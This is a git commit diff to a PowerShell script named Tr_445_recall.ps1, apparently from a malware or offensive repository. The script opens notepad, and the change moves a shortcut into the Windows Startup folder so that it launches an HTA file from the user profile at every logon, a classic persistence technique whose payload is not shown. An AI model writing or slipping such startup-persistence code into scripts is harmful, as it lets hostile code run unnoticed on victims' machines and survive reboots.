a7ac5b88b6f0aff690de89f67d3c2f071db80444
HAXORK8880 <107603133+HAXORK8880@users.noreply.github.com>
2024-01-27 17:09:06 +0600

    Update Tr_445_recall.ps1

--- Tr_445_recall.ps1
+++ Tr_445_recall.ps1
@@ -1,4 +1,4 @@
 notepad;
-$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\code1.lnk")
+$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code1.lnk")
 $Shortcut.TargetPath = "$env:USERPROFILE\code1.hta"
 $Shortcut.Save()
